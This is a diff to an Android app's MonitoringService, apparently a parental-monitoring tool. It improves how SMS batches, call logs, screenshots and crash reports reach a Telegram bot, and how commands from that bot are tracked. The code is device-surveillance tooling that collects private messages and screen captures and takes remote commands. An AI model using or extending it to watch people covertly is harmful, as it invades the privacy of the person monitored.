@@ -223,6 +223,7 @@ class MonitoringService : Service() {
     private var ownerEpoch = 0
     @Volatile
     private var skipUpdateOffsetOnce = false
+    private val offsetPersistLock = Any()
     private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
     @Volatile
     private var credsCheckAt = 0L
@@ -1663,14 +1664,20 @@ class MonitoringService : Service() {
         val updates = response.body()?.result ?: return false
         if (updates.isEmpty()) return false
         for (update in updates) {
+            beginUpdateTrack(update.updateId)
             val seen = markSeen(handledUpdateIds, update.updateId)
-            if (seen) continue
+            if (seen) {
+                finishUpdateTrack(update.updateId, true)
+                continue
+            }
             var offsetDeferred = false
+            var delivered = true
             try {
                 val callback = update.callbackQuery
                 if (callback != null) {
                     offsetDeferred = true
                     serviceScope.launch {
+                        var handled = false
                         try {
                             controlLock.withLock {
                                 try {
@@ -1681,8 +1688,13 @@ class MonitoringService : Service() {
                                     android.util.Log.e("MonitoringService", "Callback dispatch error: ${redactToken(e.message)}")
                                 }
                             }
+                            handled = true
+                        } catch (e: kotlinx.coroutines.CancellationException) {
+                            throw e
+                        } catch (e: Exception) {
+                            android.util.Log.e("MonitoringService", "Callback dispatch error: ${redactToken(e.message)}")
                         } finally {
-                            persistUpdateOffset(update.updateId)
+                            finishUpdateTrack(update.updateId, handled)
                         }
                     }
                 } else {
@@ -1770,6 +1782,7 @@ class MonitoringService : Service() {
                         val lock = if (control) controlLock else commandLock
                         offsetDeferred = true
                         serviceScope.launch {
+                            var handled = false
                             try {
                                 lock.withLock {
                                     try {
@@ -1792,36 +1805,59 @@ class MonitoringService : Service() {
                                         android.util.Log.e("MonitoringService", "Command dispatch error: ${redactToken(e.message)}")
                                     }
                                 }
+                                handled = true
+                            } catch (e: kotlinx.coroutines.CancellationException) {
+                                throw e
+                            } catch (e: Exception) {
+                                android.util.Log.e("MonitoringService", "Command dispatch error: ${redactToken(e.message)}")
                             } finally {
-                                persistUpdateOffset(update.updateId)
+                                finishUpdateTrack(update.updateId, handled)
                             }
                         }
                     }
                 }
+            } catch (e: kotlinx.coroutines.CancellationException) {
+                delivered = false
+                throw e
+            } catch (e: Exception) {
+                delivered = false
+                android.util.Log.e("MonitoringService", "Update dispatch error: ${redactToken(e.message)}")
             } finally {
-                if (!offsetDeferred) persistUpdateOffset(update.updateId)
+                if (!offsetDeferred) finishUpdateTrack(update.updateId, delivered)
             }
         }
         return true
     }
 
+    private val updateOffsetTracker = com.redeye.parentalmonitor.utils.UpdateOffsetTracker()
+
+    private fun beginUpdateTrack(updateId: Long) {
+        updateOffsetTracker.begin(updateId)
+    }
+
+    private fun finishUpdateTrack(updateId: Long, delivered: Boolean) {
+        updateOffsetTracker.finish(updateId, delivered)?.let { persistUpdateOffset(it) }
+    }
+
     private fun persistUpdateOffset(updateId: Long) {
-        try {
-            if (skipUpdateOffsetOnce) {
-                skipUpdateOffsetOnce = false
-            } else if (updateId > preferencesManager.lastUpdateId) {
-                preferencesManager.setLastUpdateIdSync(updateId)
-                if (preferencesManager.lastUpdateId < updateId) {
-                    commandBackoffUntil = maxOf(commandBackoffUntil, android.os.SystemClock.elapsedRealtime() + 60_000L)
-                    android.util.Log.w("MonitoringService", "offset persist not sticking, backing off polling")
-                }
-            }
-        } catch (_: Exception) {
+        synchronized(offsetPersistLock) {
             try {
-                commandBackoffUntil = maxOf(commandBackoffUntil, android.os.SystemClock.elapsedRealtime() + 60_000L)
+                if (skipUpdateOffsetOnce) {
+                    skipUpdateOffsetOnce = false
+                } else if (updateId > preferencesManager.lastUpdateId) {
+                    preferencesManager.setLastUpdateIdSync(updateId)
+                    if (preferencesManager.lastUpdateId < updateId) {
+                        commandBackoffUntil = maxOf(commandBackoffUntil, android.os.SystemClock.elapsedRealtime() + 60_000L)
+                        android.util.Log.w("MonitoringService", "offset persist not sticking, backing off polling")
+                    }
+                }
             } catch (_: Exception) {
+                try {
+                    commandBackoffUntil = maxOf(commandBackoffUntil, android.os.SystemClock.elapsedRealtime() + 60_000L)
+                } catch (_: Exception) {
+                }
+                android.util.Log.w("MonitoringService", "offset persist failed")
             }
-            android.util.Log.w("MonitoringService", "offset persist failed")
         }
     }
 
@@ -4019,7 +4055,7 @@ class MonitoringService : Service() {
             null
         }
         if (crash != null) {
-            if (sendFitted(crash)) {
+            if (sendFitted(crash) != SendStatus.DROPPED) {
                 CrashReporter.clearPending(this, crash)
             }
         } else {
@@ -4763,7 +4799,7 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentSmsPart = sendFitted(message, queueOnFail = true)
-                    if (sentSmsPart) {
+                    if (sentSmsPart != SendStatus.DROPPED) {
                         try {
                             preferencesManager.setSmsCursorSync(
                                 maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }),
@@ -4803,7 +4839,7 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentCallPart = sendFitted(message, queueOnFail = true)
-                    if (sentCallPart) {
+                    if (sentCallPart != SendStatus.DROPPED) {
                         try {
                             preferencesManager.setCallCursorSync(
                                 maxOf(preferencesManager.lastCallTimestamp, part.maxOf { it.date }),
@@ -4954,7 +4990,7 @@ class MonitoringService : Service() {
                 for (part in smsPage.chunked(10)) {
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) break
                     val sentSms = sendFitted(formatSmsMessage(part, freqMap, knownMap), queueOnFail = true)
-                    if (sentSms) {
+                    if (sentSms != SendStatus.DROPPED) {
                         smsCursor = maxOf(smsCursor, part.maxOf { it.id })
                         smsDate = maxOf(smsDate, part.maxOf { it.date })
                         try { preferencesManager.setSmsCursorSync(smsCursor, smsDate) } catch (_: Exception) { }
@@ -4986,7 +5022,7 @@ class MonitoringService : Service() {
                 for (part in callPage.chunked(10)) {
                     if (messageQueue.getQueueSize() >= DATA_QUEUE_SOFT_LIMIT) break
                     val sentCall = sendFitted(formatCallMessage(part, callKnown), queueOnFail = true)
-                    if (sentCall) {
+                    if (sentCall != SendStatus.DROPPED) {
                         try {
                             preferencesManager.setCallCursorSync(
                                 maxOf(preferencesManager.lastCallTimestamp, part.maxOf { it.date }),
@@ -5333,28 +5369,31 @@ class MonitoringService : Service() {
         val limit = if (typed.length <= 5) 1 else 2
         return if (best != null && bestDist in 1..limit) best else null
     }
-    private suspend fun sendFitted(message: String, replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null, queueOnFail: Boolean = true): Boolean {
-        if (awaitingOwnerLogin()) return false
+    private enum class SendStatus { SENT, QUEUED, DROPPED }
+
+    private suspend fun sendFitted(message: String, replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null, queueOnFail: Boolean = true): SendStatus {
+        if (awaitingOwnerLogin()) return SendStatus.DROPPED
         if (NetworkUtils.isAuthBlocked(preferencesManager)) {
             if (queueOnFail) {
                 val queued = messageQueue.addMessage(message)
                 if (queued) MessageScheduler.scheduleMessageSend(this)
-                return queued
+                return if (queued) SendStatus.QUEUED else SendStatus.DROPPED
             }
-            return false
+            return SendStatus.DROPPED
         }
         if (message.length <= 4000) {
             var permanent = false
-            if (sendToTelegram(message, replyMarkup, false) { permanent = true }) return true
-            if (queueOnFail && !permanent) {
+            if (sendToTelegram(message, replyMarkup, false) { permanent = true }) return SendStatus.SENT
+            if (permanent) return SendStatus.DROPPED
+            if (queueOnFail) {
                 val queued = messageQueue.addMessage(message)
                 if (replyMarkup != null) messageQueue.addMessage("Tap /help untuk menampilkan tombol menu.")
                 if (queued) MessageScheduler.scheduleMessageSend(this)
-                return queued
+                return if (queued) SendStatus.QUEUED else SendStatus.DROPPED
             }
-            return permanent
+            return SendStatus.DROPPED
         }
-        var ok = true
+        var sentAny = false
         val failed = mutableListOf<String>()
         val chunks = mutableListOf<String>()
         var rest = message
@@ -5370,10 +5409,10 @@ class MonitoringService : Service() {
                 val markup = if (idx == chunks.lastIndex) replyMarkup else NO_MARKUP
                 var permanent = false
                 if (!sendToTelegram(chunk, markup, false) { permanent = true }) {
-                    ok = false
                     if (!permanent) failed.add(chunk)
                 } else {
                     lastSentIdx = idx
+                    sentAny = true
                 }
                 if (idx != chunks.lastIndex) delay(300)
             }
@@ -5394,17 +5433,16 @@ class MonitoringService : Service() {
             }
             throw e
         }
-        if (!ok) {
-            if (failed.isEmpty()) return true
+        if (failed.isNotEmpty()) {
             if (queueOnFail) {
                 val queued = messageQueue.addMessages(failed)
                 if (replyMarkup != null && failed.last() == chunks.last()) messageQueue.addMessage("Tap /help untuk menampilkan tombol menu.")
                 if (queued) MessageScheduler.scheduleMessageSend(this)
-                return queued
+                return if (queued) SendStatus.QUEUED else SendStatus.DROPPED
             }
-            return false
+            return SendStatus.DROPPED
         }
-        return ok
+        return if (sentAny) SendStatus.SENT else SendStatus.DROPPED
     }
 
     private fun noteDroppedMessage() {
@@ -5479,7 +5517,7 @@ class MonitoringService : Service() {
             }
             if (message.length > 4000) {
                 android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
-                return sendFitted(message, replyMarkup, queueOnFail)
+                return sendFitted(message, replyMarkup, queueOnFail) != SendStatus.DROPPED
             }
 
             val (botToken, chatId) = sendCreds()
@@ -7881,45 +7919,52 @@ class MonitoringService : Service() {
             width = shotWidth
             height = shotHeight
         }
-        if (width <= 0 || height <= 0) return null
-        try { reader.acquireLatestImage()?.close() } catch (_: Exception) { }
-        var image: android.media.Image? = null
-        for (i in 0 until 20) {
-            image = try { reader.acquireLatestImage() } catch (_: Exception) { null }
-            if (image != null) break
-            kotlinx.coroutines.delay(100)
+        if (width <= 0 || height <= 0) {
+            releaseShotSurface()
+            return null
         }
-        val img = image ?: return null
         try {
-            val planes = try { img.planes } catch (_: Exception) { null }
-            if (planes == null || planes.isEmpty()) return null
-            val plane = planes[0]
-            val stride = try { plane.pixelStride } catch (_: Exception) { 0 }
-            if (stride <= 0 || height <= 0) return null
-            val rowWidth = plane.rowStride / stride
-            if (rowWidth < width) return null
-            val bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
-            if (rowWidth == width) {
-                bmp.copyPixelsFromBuffer(plane.buffer)
-            } else if (stride == 4) {
-                val src = plane.buffer
-                val rowBytes = width * 4
-                val packed = java.nio.ByteBuffer.allocateDirect(rowBytes * height)
-                for (y in 0 until height) {
-                    src.position(y * plane.rowStride)
-                    val slice = src.slice()
-                    slice.limit(rowBytes)
-                    packed.put(slice)
-                }
-                packed.flip()
-                bmp.copyPixelsFromBuffer(packed)
-            } else {
-                try { bmp.recycle() } catch (_: Exception) { }
-                return null
+            try { reader.acquireLatestImage()?.close() } catch (_: Exception) { }
+            var image: android.media.Image? = null
+            for (i in 0 until 20) {
+                image = try { reader.acquireLatestImage() } catch (_: Exception) { null }
+                if (image != null) break
+                kotlinx.coroutines.delay(100)
             }
-            return writeScreenshotJpeg(bmp)
+            val img = image ?: return null
+            try {
+                val planes = try { img.planes } catch (_: Exception) { null }
+                if (planes == null || planes.isEmpty()) return null
+                val plane = planes[0]
+                val stride = try { plane.pixelStride } catch (_: Exception) { 0 }
+                if (stride <= 0 || height <= 0) return null
+                val rowWidth = plane.rowStride / stride
+                if (rowWidth < width) return null
+                val bmp = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
+                if (rowWidth == width) {
+                    bmp.copyPixelsFromBuffer(plane.buffer)
+                } else if (stride == 4) {
+                    val src = plane.buffer
+                    val rowBytes = width * 4
+                    val packed = java.nio.ByteBuffer.allocateDirect(rowBytes * height)
+                    for (y in 0 until height) {
+                        src.position(y * plane.rowStride)
+                        val slice = src.slice()
+                        slice.limit(rowBytes)
+                        packed.put(slice)
+                    }
+                    packed.flip()
+                    bmp.copyPixelsFromBuffer(packed)
+                } else {
+                    try { bmp.recycle() } catch (_: Exception) { }
+                    return null
+                }
+                return writeScreenshotJpeg(bmp)
+            } finally {
+                try { img.close() } catch (_: Exception) { }
+            }
         } finally {
-            try { img.close() } catch (_: Exception) { }
+            releaseShotSurface()
         }
     }
 
